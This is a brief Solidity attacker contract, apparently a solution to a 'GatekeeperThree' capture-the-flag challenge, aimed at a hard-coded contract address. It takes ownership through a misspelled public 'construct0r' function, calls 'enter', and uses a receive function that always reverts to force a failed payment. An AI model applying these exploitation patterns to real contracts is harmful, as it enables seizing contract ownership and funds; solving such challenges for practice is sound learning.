pragma solidity ^0.6.0;

interface IGatekeeperThree {
  function construct0r() external;
  function enter() external returns (bool);
}

contract GateThreeAttacker {

    IGatekeeperThree target = IGatekeeperThree(0x0E4Ba6d2ac806Fe47207A2A32BD965430b507dbc);

    function callconst() public {
        target.construct0r();
    }

    function attack() public {
        target.enter();
    }

    receive() external payable {
        assert(false);
    }
}